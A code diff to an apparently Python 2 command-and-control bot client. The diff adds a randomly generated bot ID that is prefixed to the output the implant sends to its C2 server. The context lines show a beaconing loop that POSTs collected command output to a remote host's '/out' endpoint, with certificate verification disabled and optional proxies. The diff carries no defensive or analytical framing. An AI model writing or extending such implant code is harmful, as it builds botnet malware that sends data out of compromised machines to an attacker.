@@ -3,8 +3,16 @@ import requests
 import logging
 import subprocess
 import time
+import uuid
 from optparse import OptionParser
 
+botID = []
+
+def genID(string_length=8):
+  random = str(uuid.uuid4())
+  random = random.upper()
+  botID.append(random[0:string_length])
+  print botID
 
 def beacon(host, seconds, proxies):
   time.sleep(int(seconds))
@@ -15,8 +23,10 @@ def beacon(host, seconds, proxies):
       send(host, output, proxies)
   except:
     return 0
-  
+
 def send(host, output, proxies):
+  print botID[0]
+  output = botID[0]+' '+output
   if proxies is not None:
     response = requests.post('https://'+host+'/out', data=output, verify=False, proxies=proxies)
     return response     
@@ -115,6 +125,9 @@ def main():
 
   if opts.beacon is None:
     opts.beacon = raw_input("How often should it beacon to C2 server: ")
+
+  # Generate our botID
+  genID()
 
   # Main Event Loop:
   try:
